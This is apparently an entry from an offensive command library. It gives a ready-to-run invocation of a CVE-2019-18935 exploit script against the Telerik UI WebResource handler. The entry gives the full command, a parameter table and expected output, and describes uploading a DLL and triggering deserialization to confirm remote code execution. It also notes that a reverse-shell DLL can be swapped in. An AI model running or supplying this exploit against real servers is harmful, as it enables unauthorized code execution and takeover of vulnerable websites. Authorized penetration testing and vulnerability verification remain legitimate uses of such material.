---
id: cmd-upload-trigger-poc
data: >-
  python3 CVE-2019-18935.py -u
  https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v
  2016.2.607 -f 'C:\Windows\Temp' -p sleep.dll
tags:
  - rce
  - deserialization
type: command
output: >-
  Server hangs ~10s, then response with fileInfo JSON and measured response time
  (e.g., 12.34 seconds)
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:33.134Z'
verified: false
validated: true
submitted: true
---
# upload-and-trigger-dll-poc

## Command

```bash
python3 CVE-2019-18935.py -u https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607 -f 'C:\Windows\Temp' -p sleep.dll
```

## Description

Uploads a DLL payload to the Telerik handler and triggers deserialization to execute a PoC gadget, measuring server delay for RCE confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target upload URL | Yes |
| -v | Telerik version | Yes |
| -f | Server folder path | Yes |
| -p | Local DLL path | Yes |

## Examples

### Basic Usage

```bash
python3 CVE-2019-18935.py -u https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607 -f 'C:\Windows\Temp' -p sleep.dll
```

### Advanced Usage

Use for reverse shell DLL by replacing sleep.dll.

## Expected Output

Upload confirmation, delay, then '[*] Response time: X.XX seconds' with fileInfo.

## Related

- [[commands/build-dll]]
